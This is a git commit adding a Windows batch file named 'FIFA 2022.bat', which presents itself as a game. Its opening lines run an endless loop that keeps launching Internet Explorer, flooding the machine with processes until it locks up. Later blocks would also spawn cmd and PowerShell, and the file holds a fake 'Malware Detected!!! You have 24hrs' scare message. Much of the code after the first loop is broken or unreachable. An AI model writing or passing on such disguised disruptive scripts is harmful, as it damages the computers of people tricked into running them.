5c5b16ed6c041a79a86ac1b7b15674313e45f1e2
romeoagyemang <romeoasiamah79@gmail.com>
2023-04-19 18:12:46 -0600

    initial commit

---
+++ FIFA 2022.bat
@@ -0,0 +1,52 @@
+@echo off
+:A
+start iexplore.exe
+goto A
+:A
+start iexplore.exe
+goto A
+:A
+start calc.exe
+goto A
+:A
+start notepad.exe
+goto A
+:A
+start winword.exe
+goto A
+::echo fatal Error.C:// directory corrupted . !!!Malware Detected!!! *You have 24hrs to settle the PC guy*
+pause
+:A
+start iexplore.exe
+goto A
+:A
+start cmd.exe
+goto A
+:A
+start calc.exe
+goto A
+:A
+start notepad.exe
+goto A
+:A
+start powershell.exe
+goto A
+A:
+goto A
+start powershell.exe
+goto A
+A: 
+start calc.exe
+A:
+goto A
+start notepad.exe
+goto A
+:A
+goto A
+echo fatal Error.C:// directory corrupted . !!!Malware Detected!!! *You have 24hrs to settle the PC guy*
+:A
+goto A
+start Media Player.exe
+:A
+goto A
+start c:
